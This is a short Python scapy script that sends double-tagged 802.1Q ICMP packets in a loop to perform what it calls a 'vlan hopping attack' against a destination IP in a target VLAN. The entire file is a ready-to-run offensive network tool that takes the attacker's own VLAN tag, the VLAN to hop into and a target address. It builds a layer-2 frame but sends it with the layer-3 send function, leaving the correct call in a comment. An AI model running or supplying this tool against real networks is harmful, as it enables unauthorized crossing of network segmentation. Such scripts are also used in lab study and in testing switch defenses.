#!/usr/bin/env python3

import optparse
import scapy.all as scapy
import time

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-o", "--otag", dest="outer", help="Your own vlan tag")
    parser.add_option("-i", "--itag", dest="inner", help="The vlan tag to hop")
    parser.add_option("-a", "--ip", dest="ip", help="Destination IP address")
    (options, arguments) = parser.parse_args()
    if not options.outer:
        parser.error("[-] Enter your vlan tag, use --help")
    if not options.inner:
        parser.error("[-] Enter a target vlan tag, use --help")
    if not options.ip:
        parser.error("[-] Enter an destination ip address, use --help")
    return options


def v_hopping(outer_vlan, inner_vlan, ip):
    outer_vlan = int(outer_vlan)
    inner_vlan = int(inner_vlan)
    ether = scapy.Ether()
    dot1q_outer = scapy.Dot1Q(vlan=outer_vlan)
    dot1q_inner = scapy.Dot1Q(vlan=inner_vlan)
    d_ip = scapy.IP(dst=ip)
    ICMP = scapy.ICMP()
    packet = ether/dot1q_outer/dot1q_inner/d_ip/ICMP
    scapy.send(packet, verbose=False)
    #scapy.sendp(Ether()/Dot1Q(vlan=outer_vlan)/Dot1Q(vlan=inner_vlan)/IP(dst=ip)/ICMP())

options = get_arguments()

packet_count = 0

while True:
    try:
        v_hopping(options.outer, options.inner, options.ip)
        packet_count = packet_count + 1
        print("\r[+] {} packets sent to {} in vlan {}".format(packet_count, options.ip, options.inner), end="")
        time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Quitting the vlan hopping attack")
        break

